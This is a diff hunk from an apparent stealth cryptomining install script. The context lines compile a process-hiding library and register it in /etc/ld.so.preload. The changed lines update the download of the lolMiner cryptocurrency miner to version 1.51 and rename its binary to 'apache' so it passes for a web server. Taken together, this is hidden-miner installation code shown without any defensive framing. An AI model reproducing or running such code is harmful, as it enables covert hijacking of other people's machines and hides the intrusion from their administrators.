@@ -11,9 +11,9 @@ gcc -Wall -fPIC -shared -o libprocesshider.so processhider.c -ldl
 mv libprocesshider.so /usr/local/lib/;echo /usr/local/lib/libprocesshider.so >> /etc/ld.so.preload
 cd ..
 
-wget https://github.com/Lolliedieb/lolMiner-releases/releases/download/1.47/lolMiner_v1.47_Lin64.tar.gz
-tar -xf lolMiner_v1.47_Lin64.tar.gz
-cd 1.47
+wget https://github.com/Lolliedieb/lolMiner-releases/releases/download/1.51/lolMiner_v1.51_Lin64.tar.gz
+tar -xf lolMiner_v1.51_Lin64.tar.gz
+cd 1.51
 mv lolMiner ../apache
 cd ..
 
